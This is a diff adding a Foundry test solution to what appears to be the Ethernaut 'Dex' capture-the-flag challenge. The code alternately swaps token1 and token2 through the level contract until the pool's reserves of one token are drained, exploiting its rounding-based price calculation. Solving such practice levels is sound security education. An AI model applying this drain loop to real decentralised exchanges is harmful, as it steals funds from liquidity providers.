@@ -48,7 +48,31 @@ contract TestDex is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
-        
+        bool token1IsFirst = true;
+        while (token1.balanceOf(levelAddress) > 0 && token2.balanceOf(levelAddress) > 0) {
+            if (token1IsFirst) {
+                if (token1.balanceOf(player) > token1.balanceOf(levelAddress)) {
+                    level.approve(levelAddress, token1.balanceOf(levelAddress));
+                    level.swap(address(token1), address(token2), token1.balanceOf(levelAddress));
+                }
+                else {
+                    level.approve(levelAddress, token1.balanceOf(player));
+                    level.swap(address(token1), address(token2), token1.balanceOf(player));
+                }
+            }
+            else {
+                if (token2.balanceOf(player) > token2.balanceOf(levelAddress)) {
+                    level.approve(levelAddress, token2.balanceOf(levelAddress));
+                    level.swap(address(token2), address(token1), token2.balanceOf(levelAddress));
+                }
+                else {
+                    level.approve(levelAddress, token2.balanceOf(player));
+                    level.swap(address(token2), address(token1), token2.balanceOf(player));
+                }
+            }
+            token1IsFirst = !token1IsFirst;
+        }
+
         vm.stopPrank();
     }
 }
